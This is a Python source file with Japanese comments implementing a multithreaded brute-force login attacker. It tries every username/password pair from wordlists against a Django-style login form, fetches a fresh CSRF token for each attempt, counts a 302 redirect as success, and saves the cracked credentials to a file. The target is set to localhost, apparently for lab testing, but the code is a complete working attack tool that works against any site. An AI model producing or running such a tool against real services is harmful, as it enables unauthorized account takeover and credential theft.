import requests
import threading
from concurrent.futures import ThreadPoolExecutor, wait
from bs4 import BeautifulSoup

class BruteForceAttacker:
    def __init__(self, target_url, login_path, max_threads):
        self.target_url = target_url.rstrip('/')
        self.login_url = f"{self.target_url}{login_path}"
        self.session = requests.Session()
        self.successful_logins = []
        self.max_threads = max_threads
        self.lock = threading.Lock()

    def get_csrf_token_for_session(self, session):
        """指定されたセッションでCSRFトークンを取得"""
        try:
            response = session.get(self.login_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            csrf_input = soup.find('input', {'name': 'csrfmiddlewaretoken'})
            if csrf_input:
                return csrf_input.get('value')
            else:
                print("CSRFトークンが見つかりませんでした")
            return None
        except Exception:
            return None

    def attempt_login(self, username, password):
        """ログイン試行"""
        # 各スレッドで独立したセッションを使用
        session = requests.Session()

        # CSRFトークンを取得
        csrf_token = self.get_csrf_token_for_session(session)
        if not csrf_token:
            return False

        # ログインデータを準備
        login_data = {
            'username': username,
            'password': password,
            'csrfmiddlewaretoken': csrf_token
        }

        try:
            # ログイン試行
            response = session.post(
                self.login_url,
                data=login_data,
                allow_redirects=False
            )

            if response.status_code == 302:
                with self.lock:
                    self.successful_logins.append(f"{username}:{password}")
                return True
            else:
                return False

        except Exception:
            return False


    def run_attack(self, usernames, passwords):
        credentials = [(username, password) for username in usernames for password in passwords]

        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            # タスク投入
            futures = []
            for username, password in credentials:
                future = executor.submit(self.attempt_login, username, password)
                futures.append(future)

            # 全タスクの完了を待つ
            wait(futures)

        print(self.successful_logins)
        with open("successful_logins.txt", "w") as f:
            for creds in self.successful_logins:
                f.write(f"{creds}\n")

def load_wordlist(filename):
    """ワードリストファイルを読み込み"""
    with open(filename, 'r', encoding='utf-8') as f:
        words = [line.strip() for line in f]
    return words

def main():
    # ユーザー名リストをファイルから読み込み
    usernames = load_wordlist("username_list.txt")

    # パスワードリストをファイルから読み込み
    passwords = load_wordlist("password_list.txt")

    # 攻撃実行（マルチスレッド攻撃）
    attacker = BruteForceAttacker("http://127.0.0.1:8000", "/auth/login", 20)
    attacker.run_attack(usernames, passwords)

if __name__ == "__main__":
    main()
